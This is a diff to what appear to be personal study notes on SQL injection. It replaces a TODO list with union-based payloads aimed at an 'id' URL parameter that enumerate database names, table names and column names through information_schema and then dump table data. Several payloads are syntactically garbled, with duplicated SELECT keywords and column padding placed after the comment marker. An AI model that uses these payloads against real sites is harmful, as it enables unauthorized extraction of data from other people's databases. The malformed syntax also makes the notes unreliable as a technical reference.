@@ -56,14 +56,17 @@ Some interesting functions:
 1. version()
 2. system_user()
 3. database()
+  
+Retrieve database names:
+> ?id=1' union select UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata,5,6 --+
+ 
+Retrieve table names:
+> ?id=1' UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='database1'--,5,6 --+
 
-### TODO
-1. How to retrieve information from the database once you know the database name 
-information_schema.tables?
-2. How to retrieve information about what the tables are named
-3. How to retrieve information from the entries in the tables
+Retrieve column names:
 
+> ?id=1' UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='table1',5,6 --+
 
+Retrieve data:
 
-
-
+ > ?id=1' UNION ALL SELECT NULL,concat(0x28,column1,0x3a,column2,0x29) FROM table1,5,6 --+
